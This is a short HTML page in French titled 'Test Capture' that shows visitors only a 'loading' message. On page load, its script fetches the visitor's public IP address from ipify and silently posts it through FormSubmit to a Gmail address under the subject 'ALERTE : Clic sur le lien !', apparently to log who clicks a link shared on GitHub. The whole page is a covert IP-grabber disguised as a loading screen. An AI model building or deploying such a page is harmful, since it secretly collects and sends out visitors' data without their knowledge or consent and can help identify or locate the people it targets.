<!DOCTYPE html>
<html>
<head>
    <title>Test Capture</title>
</head>
<body>

    <h1>Chargement en cours...</h1>

    <script>
        async function envoyerIP() {
            try {
                // 1. On récupère l'IP
                const responseIP = await fetch('https://api.ipify.org?format=json');
                const dataIP = await responseIP.json();
                const ipClient = dataIP.ip;

                // 2. On prépare les données
                const donnees = {
                    message: "Nouvelle visite détectée sur GitHub",
                    ip: ipClient,
                    _captcha: "false",
                    _subject: "ALERTE : Clic sur le lien !"
                };

                // 3. Envoi via AJAX à FormSubmit
                const envoi = await fetch("https://formsubmit.co/ajax/code.codeur84@gmail.com", {
                    method: "POST",
                    headers: { 
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(donnees)
                });

                if (envoi.ok) {
                    console.log("IP envoyée avec succès : " + ipClient);
                }

            } catch (erreur) {
                console.error("Erreur de script :", erreur);
            }
        }

        // Exécute la fonction dès que la page s'affiche
        window.onload = envoyerIP;
    </script>
</body>
</html>
